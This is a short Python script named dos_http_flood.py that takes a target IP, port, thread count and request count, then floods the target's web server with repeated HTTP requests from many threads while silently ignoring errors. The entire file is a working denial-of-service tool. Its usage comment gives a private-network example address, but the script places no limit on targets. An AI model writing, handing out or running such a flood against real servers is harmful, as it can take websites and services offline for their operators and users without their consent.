#!/usr/bin/env python3
# Usage: python3 dos_http_flood.py <target_ip> <port> <threads> <requests_per_thread>
# Exemple: python3 dos_http_flood.py 10.0.1.10 80 20 1000

import sys
import threading
import urllib.request

def worker(url, n):
    for i in range(n):
        try:
            urllib.request.urlopen(url, timeout=2).read()
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: http_flood.py <ip> <port> <threads> <req_per_thread>")
        sys.exit(1)

    ip = sys.argv[1]; port = sys.argv[2]
    threads = int(sys.argv[3]); reqs = int(sys.argv[4])

    url = f"http://{ip}:{port}/"
    ths = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(url, reqs))
        t.daemon = True
        t.start()
        ths.append(t)

    for t in ths:
        t.join()
